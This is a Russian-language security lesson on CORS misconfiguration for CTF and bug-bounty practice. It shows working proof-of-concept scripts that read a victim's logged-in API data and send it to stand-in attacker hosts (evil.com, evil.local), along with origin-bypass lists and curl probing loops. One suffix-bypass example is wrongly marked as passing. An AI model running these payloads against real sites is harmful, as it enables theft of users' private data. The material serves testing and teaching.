---
id: web-cors-deep
title: "CORS advanced: null origin, regex bypass, credentials, internal networks"
category: web
parent: web-browser-core
difficulty: medium
order: 3
tags: [cors, misconfig, null-origin, credentials, regex-bypass]
prerequisites: [web-same-origin-cors, web-browser-security]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Продвинутые ошибки CORS: доверие null, обход regex-валидации, работа с credentials и доступ к внутренним сетям."
---

CORS (Cross-Origin Resource Sharing) — механизм, который позволяет браузеру делать кросс-доменные запросы к API, ослабляя Same-Origin Policy. Ошибка в его настройке — одна из самых дорогих уязвимостей: она позволяет чужому сайту читать данные пользователя с вашей сессией. Этот урок — про типичные ошибки конфигурации CORS, способы их эксплуатации и тонкие случаи: `null` origin, regex-байпасы, credentials и доступ к внутренним сетям.

## Как работает CORS

Браузер применяет SOP: страница с `evil.com` не может прочитать ответ с `api.victim.com`. CORS — исключение: сервер отвечает заголовком `Access-Control-Allow-Origin` (ACAO), и если он совпадает с origin запроса (или равен `*`), браузер отдаёт ответ JS-коду.

Ключевые заголовки:

| Заголовок | Смысл |
|-----------|-------|
| `Access-Control-Allow-Origin` | разрешённый origin (или `*`) |
| `Access-Control-Allow-Credentials` | разрешить cookie/Authorization |
| `Access-Control-Allow-Methods` | разрешённые методы |
| `Access-Control-Allow-Headers` | разрешённые заголовки |
| `Access-Control-Expose-Headers` | какие заголовки видны JS |
| `Vary: Origin` | кэшировать по origin |

Комбинация `ACAO: *` и `ACAC: true` **запрещена** браузером. Поэтому если нужны credentials, сервер обязан отражать конкретный origin — и именно здесь начинаются ошибки.

## Ошибка 1: отражение произвольного Origin

Самый частый баг — сервер слепо отражает заголовок `Origin` в `ACAO`.

```bash
$ curl -sI https://api.victim.com/me -H 'Origin: https://evil.com' | grep -i access-control
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
```

Это критично: любой сайт может читать ответы API с сессией жертвы.

```html
<script>
fetch('https://api.victim.com/me', {credentials:'include'})
  .then(r=>r.text()).then(t=>fetch('https://evil.com/steal?d='+encodeURIComponent(t)));
</script>
```

## Ошибка 2: `null` origin

Заголовок `Origin: null` приходит из песочниц (`sandbox`), `data:`/`file:` документов и редиректов. Если сервер доверяет `null`, атакующий получает доступ через iframe с `sandbox`.

```bash
$ curl -sI https://api.victim.com/me -H 'Origin: null' | grep -i access-control
access-control-allow-origin: null
access-control-allow-credentials: true
```

```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://api.victim.com/me',{credentials:'include'}).then(r=>r.text()).then(t=>parent.postMessage(t,'*'))</script>"></iframe>
```

## Ошибка 3: regex/подстрочный байпас

Сервер проверяет origin регуляркой или `endsWith` — и проверка ломается.

```bash
# доверяет *.victim.com, но проверка endsWith('.victim.com')
Origin: https://evil.victim.com.attacker.com   -> проходит?
# проверка startsWith('https://victim.com')
Origin: https://victim.com.attacker.com        -> проходит
# проверка contains('victim.com')
Origin: https://attacker.com/victim.com        -> проходит
# незаякоренная регулярка
Origin: https://attacker.com/?victim.com
```

Правило: проверяйте каждый вариант — с суффиксом, префиксом, подстрокой, с портом, с другой схемой (`http://` вместо `https://`), с верхним регистром.

## Ошибка 4: доверие поддомену с XSS

Если сервер доверяет `*.victim.com`, а на любом поддомене есть XSS (или subdomain takeover), CORS-защита обходится через этот поддомен. Часто «забытый» `staging.victim.com` — это точка входа.

```bash
# проверяем список доверенных origin
for o in https://staging.victim.com https://dev.victim.com https://old.victim.com; do
  curl -sI https://api.victim.com/me -H "Origin: $o" | grep -i 'access-control-allow-origin'
done
```

## Ошибка 5: внутренние сети и преflight

CORS-ошибки особенно опасны, когда API доступен из интернета и проксирует внутренние сервисы. Тогда кража данных или SSRF через CORS может открыть внутреннюю сеть. Проверяйте, не отражает ли сервер origin и на внутренних эндпоинтах.

## Preflight и простые запросы

Preflight (`OPTIONS`) отправляется для «непростых» запросов (нестандартные заголовки, методы кроме GET/POST/HEAD, `Content-Type` кроме простых). Ответ `Access-Control-Allow-Methods`/`-Headers` определяет, что разрешено. Если preflight отвечает разрешительно для всех origin, а фактический запрос тоже — уязвимость подтверждена.

```bash
# preflight
curl -sI -X OPTIONS https://api.victim.com/me \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: DELETE' \
  -H 'Access-Control-Request-Headers: authorization'
```

## Инструменты и команды

```bash
# быстрый тест отражения origin
curl -sI https://t/api -H 'Origin: https://evil.com' | grep -iE 'access-control|vary'
# набор origin-вариантов
for o in https://evil.com null https://t.evil.com https://evilt.com http://t; do
  printf '%s -> ' "$o"
  curl -sI https://t/api -H "Origin: $o" | grep -i 'access-control-allow-origin' | tr -d '\r'
done
# автоматизация
nuclei -u https://t -tags cors -silent
```

## Разобранный пример: кража данных через CORS

```bash
# 1. API отражает origin и разрешает credentials
$ curl -sI 'https://api.shop.local/api/orders' -H 'Origin: https://evil.local'
access-control-allow-origin: https://evil.local
access-control-allow-credentials: true

# 2. проверяем, что данные приватные (с cookie)
$ curl -s 'https://api.shop.local/api/orders' -b 'session=abc' -H 'Origin: https://evil.local' | jq .
{"orders":[{"id":1001,"total":1299,"address":"..."}]}

# 3. на странице атакующего
cat > evil.html <<'HTML'
<script>
fetch('https://api.shop.local/api/orders',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>navigator.sendBeacon('https://evil.local/collect', JSON.stringify(d)));
</script>
HTML
```

Артефакт — данные заказов жертвы на сервере атакующего. Это критичная утечка.

## Крайние случаи

- **`Vary: Origin` отсутствует** — кэш CDN может закэшировать ACAO для одного origin и отдать другому.
- **Порт и схема.** `http://victim.com` и `https://victim.com` — разные origin; проверяйте оба.
- **Регистр.** `Origin: HTTPS://VICTIM.COM` — некоторые проверки регистрозависимы.
- **Trailing dot.** `https://victim.com.` — иногда проходит наивную проверку.
- **Отражающий ACAO на статике** — тоже опасно, если отдаёт чувствительное.
- **`Access-Control-Allow-Origin` без `Vary`** — тихий баг, который проявится только под кэшем.

## Что делать дальше / решение

1. **Проверьте отражение** — подставьте `Origin: https://evil.com` и посмотрите ACAO.
2. **Проверьте credentials** — есть ли `ACAC: true` и уходит ли сессия.
3. **Проверьте `null`** — `Origin: null` через sandbox-iframe.
4. **Проверьте байпасы** — суффикс, префикс, подстрока, регистр, порт, схема.
5. **Проверьте поддомены** — доверенный поддомен с XSS ломает защиту.
6. **Подтвердите PoC** — страница, крадущая данные, либо `curl` с `Origin`.
7. **Тупик** — переходите к другим клиентским векторам (postMessage, XS-Leaks).

## Справочная таблица проверок

| Проверка | Origin для подстановки | Признак уязвимости |
|----------|------------------------|--------------------|
| отражение | `https://evil.com` | ACAO = evil.com |
| null | `null` | ACAO = null |
| суффикс | `https://evil.victim.com.attacker.com` | ACAO проходит |
| префикс | `https://victim.com.attacker.com` | ACAO проходит |
| подстрока | `https://attacker.com/victim.com` | ACAO проходит |
| порт | `https://victim.com:1337` | ACAO проходит |
| схема | `http://victim.com` | ACAO проходит |

## Кэширование и заголовок Vary

CORS тесно связан с кэшированием. Если сервер отвечает `Access-Control-Allow-Origin` без заголовка `Vary: Origin`, промежуточный кэш (CDN, reverse proxy) может закэшировать ответ с ACAO, вычисленным для одного origin, и отдать его клиенту с другим origin. На практике это приводит к тому, что атакующий получает в ответ ACAO, соответствующий чужому домену, и читает данные.

```bash
# проверяем наличие Vary
$ curl -sI https://api.victim.com/me -H 'Origin: https://evil.com' | grep -iE 'access-control-allow-origin|vary'
access-control-allow-origin: https://evil.com
# Vary: Origin отсутствует -> риск кэширования

# проверяем поведение кэша: два запроса с разными origin
curl -sI https://api.victim.com/public -H 'Origin: https://a.com' | grep -i allow-origin
curl -sI https://api.victim.com/public -H 'Origin: https://b.com' | grep -i allow-origin
# если второй вернул ACAO от первого -> кэш путает origin
```

Это особенно опасно на публичных эндпоинтах, которые кэшируются CDN: атакующий «прогревает» кэш своим origin, а жертва получает уже подменённый ACAO.

## CORS как путь во внутреннюю сеть

Когда интернет-приложение проксирует внутренние сервисы, слабый CORS открывает доступ к ним из браузера. Атакующий подсовывает жертве страницу, которая через CORS читает внутренние API, недоступные снаружи. Проверяйте, отражает ли origin проксирующий эндпоинт и не отдаёт ли он данные внутренних систем.

```bash
# внутренний прокси-эндпоинт
curl -sI 'https://app.victim.com/proxy/internal/status' -H 'Origin: https://evil.com' | grep -i allow-origin
# если отражает -> внутренние данные доступны из браузера
```

Это комбинация CORS и SSRF-подобной архитектуры: сам запрос делает браузер жертвы, но данные внутренней системы утекают. Такие находки оцениваются как критичные.

## Автоматизированное обнаружение

Ручная проверка быстра для нескольких origin, но на большом scope нужен инструмент. `nuclei` имеет теги `cors`, а простой скрипт перебирает варианты origin и сравнивает ACAO.

```bash
# nuclei
nuclei -u https://api.victim.com -tags cors -silent

# ручной цикл по вариантам
cat > origins.txt <<'EOF'
https://evil.com
null
https://victim.com.evil.com
https://evil-victim.com
https://evil.com/victim.com
http://victim.com
https://victim.com:1337
EOF
while read o; do
  r=$(curl -sI "https://api.victim.com/me" -H "Origin: $o" | grep -i 'access-control-allow-origin' | tr -d '\r')
  [ -n "$r" ] && echo "$o -> $r"
done < origins.txt
```

Результат: список origin, которые сервер отражает. Любой из них — потенциальная точка эксплуатации, если есть credentials.

## Практический чек-лист тестировщика

- [ ] ACAO отражает произвольный origin?
- [ ] Есть `Access-Control-Allow-Credentials: true` вместе с отражением?
- [ ] Принимается ли `Origin: null`?
- [ ] Проходят ли суффикс/префикс/подстрока/порт/схема?
- [ ] Есть ли `Vary: Origin` (защита от кэш-путаницы)?
- [ ] Доверяет ли сервер поддомену с возможным XSS?
- [ ] Проксирует ли API внутренние сервисы?
- [ ] Подтверждён ли PoC кражи данных страницей атакующего?

## Что делать дальше / решение

Если нашли отражение origin с credentials — немедленно соберите PoC: страницу, которая с сессией жертвы читает приватный эндпоинт и отправляет данные на ваш сервер. Это самый убедительный артефакт. Если credentials нет, но отражается origin — проверьте, отдаёт ли эндпоинт чувствительные данные без cookie (иногда API доверяет заголовкам, а не сессии). Если отражения нет, но `Vary` отсутствует — проверьте кэш. Тупик на всех ветках — переходите к postMessage и XS-Leaks: это соседние клиентские каналы, которые часто закрыты хуже, чем CORS.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Откуда берётся `Origin: null`?"
  options:
    - "Из sandbox-iframe, `data:`/`blob:` документов, `file://`"
    - "Из HTTPS-сайтов"
    - "Из DNS"
    - "Из cookie"
  answer: 0
  explanation: "Эти контексты дают непрозрачный/нулевой origin."
- question: "Какой домен обходит проверку `origin.endsWith('example.com')`?"
  options:
    - "`https://attackerexample.com`"
    - "`https://example.com.attacker.net`"
    - "`https://attacker.net`"
    - "`https://sub.attacker.net`"
  answer: 0
  explanation: "Строка заканчивается на `example.com`, поэтому проверка пропускает её."
- question: "Что нужно для чтения приватных данных через CORS?"
  options:
    - "Отражение origin + `Access-Control-Allow-Credentials: true`"
    - "Только `ACAO: *`"
    - "Только cookie"
    - "Только HTTPS"
  answer: 0
  explanation: "Credentials-режим требует `ACAC: true` и точного/отражённого origin."
- question: "Как CORS помогает сканировать внутреннюю сеть?"
  options:
    - "Браузер жертвы может обращаться к внутренним адресам, а CORS отдаёт ответ атакующему"
    - "Он меняет DNS"
    - "Он шифрует трафик"
    - "Он открывает порты на сервере"
  answer: 0
  explanation: "Это CORS-based SSRF из браузера жертвы."
- question: "Какая проверка CORS корректна?"
  options:
    - "Точное сравнение origin или `endsWith('.example.com')` с проверкой схемы"
    - "`includes('example.com')`"
    - "`startsWith('http')`"
    - "Разрешить всем"
  answer: 0
  explanation: "Нужна граница домена, а не подстрока."
```

## Где пригодится

- **CTF (Web):** CORS-мисконфиг с хитрым whitelist — типичная задача.
- **Bug bounty:** отражение origin с credentials — топ-класс выплат.
- **Пентест:** аудит API-доменов и внутренних сервисов через браузер.
- **Работа (AppSec/Dev):** строгий whitelist, обработка `null`, отказ от regex-подстрок.
